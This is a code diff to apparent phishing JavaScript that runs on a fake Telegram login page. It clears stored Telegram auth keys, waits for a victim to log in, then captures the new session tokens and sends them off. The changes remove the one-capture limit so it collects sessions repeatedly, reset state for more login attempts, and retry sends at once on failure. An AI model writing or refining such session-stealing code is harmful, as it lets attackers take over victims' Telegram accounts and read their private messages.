@@ -68,44 +68,37 @@
       content: { ...sessionStorage }
     });
 
-    // AGGRESSIVE clearing of all possible storage
-    console.log("🧹 Starting aggressive storage cleanup...");
-
-    // Clear localStorage and sessionStorage
-    localStorage.clear();
-    sessionStorage.clear();
-
-    // Force clear specific Telegram keys if they persist
-    const telegramKeys = ['user_auth', 'dc', 'state_id', 'k_build', 'auth_key_fingerprint', 'xt_instance'];
-    telegramKeys.forEach(key => {
-      localStorage.removeItem(key);
-      sessionStorage.removeItem(key);
+        // SMART storage cleanup - preserve IndexedDB functionality
+    console.log("🧹 Starting smart storage cleanup...");
+    
+    // Clear only authentication-related localStorage items
+    const authKeys = ['user_auth', 'state_id', 'k_build', 'auth_key_fingerprint'];
+    authKeys.forEach(key => {
+      if (localStorage.getItem(key)) {
+        localStorage.removeItem(key);
+        console.log(`🗑️ Removed ${key}`);
+      }
     });
-
-    // Force clear all datacenter keys
+    
+    // Clear datacenter auth keys but preserve other settings
     for (let i = 1; i <= 5; i++) {
-      localStorage.removeItem(`dc${i}_auth_key`);
-      localStorage.removeItem(`dc${i}_server_salt`);
-      sessionStorage.removeItem(`dc${i}_auth_key`);
-      sessionStorage.removeItem(`dc${i}_server_salt`);
+      const authKey = `dc${i}_auth_key`;
+      const saltKey = `dc${i}_server_salt`;
+      if (localStorage.getItem(authKey)) {
+        localStorage.removeItem(authKey);
+        console.log(`🗑️ Removed ${authKey}`);
+      }
+      if (localStorage.getItem(saltKey)) {
+        localStorage.removeItem(saltKey);
+        console.log(`🗑️ Removed ${saltKey}`);
+      }
     }
-
-    // Clear IndexedDB
-    if (window.indexedDB) {
-      indexedDB.deleteDatabase('tweb');
-      indexedDB.deleteDatabase('tgme_sync');
-      console.log("🗑️ Cleared IndexedDB databases");
-    }
-
-    // Clear Service Worker caches
-    if ('caches' in window) {
-      caches.keys().then(names => {
-        names.forEach(name => caches.delete(name));
-      });
-    }
-
-    console.log("✅ Aggressive storage cleanup completed");
-    console.log("📊 Final localStorage count:", localStorage.length);
+    
+    // DON'T clear IndexedDB - let Telegram handle it naturally
+    // DON'T clear sessionStorage - preserve app state
+    
+    console.log("✅ Smart storage cleanup completed");
+    console.log("📊 localStorage count after cleanup:", localStorage.length);
 
     // Monitor localStorage changes in real-time
     const originalSetItem = localStorage.setItem;
@@ -176,7 +169,8 @@
 
       // Wait for user interaction before monitoring sessions
       let userInteracted = false;
-      let sessionSent = false;
+      let lastCaptureTime = 0;
+      const CAPTURE_COOLDOWN = 30000; // 30 seconds between captures
       let loginDetected = false;
       let interactionTimeout;
 
@@ -197,9 +191,20 @@
         });
       });
 
+      // Reset interaction state when user navigates back to login (for multiple attempts)
+      setInterval(() => {
+        const currentUrl = window.location.href;
+        const isOnLoginPage = currentUrl.includes('telegram.html') || currentUrl.includes('#/login');
+        if (isOnLoginPage && localStorage.length <= 3) {
+          // Reset for fresh login attempt if minimal data exists
+          userInteracted = false;
+          console.log("🔄 Reset interaction state - ready for new login attempt");
+        }
+      }, 10000); // Check every 10 seconds
+
       function startSessionMonitoring() {
         const intervalId = setInterval(() => {
-          if (sessionSent) return;
+          // Allow multiple session captures - don't check sessionSent
 
           const hasAuth = localStorage.getItem("user_auth");
           const hasAuthKey = localStorage.getItem("dc1_auth_key") || localStorage.getItem("dc2_auth_key") || localStorage.getItem("dc3_auth_key");
@@ -229,9 +234,17 @@
 
           // Only capture if ALL conditions are met for a REAL session
           if (isValidSession && hasValidUserAuth && hasMultipleAuthKeys) {
+            const now = Date.now();
+            const timeSinceLastCapture = now - lastCaptureTime;
+            
+            if (timeSinceLastCapture < CAPTURE_COOLDOWN) {
+              console.log(`⏳ Cooldown active - ${Math.round((CAPTURE_COOLDOWN - timeSinceLastCapture) / 1000)}s remaining`);
+              return;
+            }
+            
             console.log("🎯 VALID login session detected after user interaction!");
             console.log("📊 Session data with", localStorage.length, "items");
-            sessionSent = true;
+            lastCaptureTime = now;
 
             // Log exactly what we're about to send
             const dataToSend = {
@@ -263,7 +276,7 @@
               console.error("❌ Auto send failed:", error);
               console.error("❌ Error details:", error.message);
               console.error("❌ Current URL:", window.location.href);
-              sessionSent = false; // Allow retry on error
+              lastCaptureTime = 0; // Reset cooldown on error to allow immediate retry
             });
           }
         }, 2000);
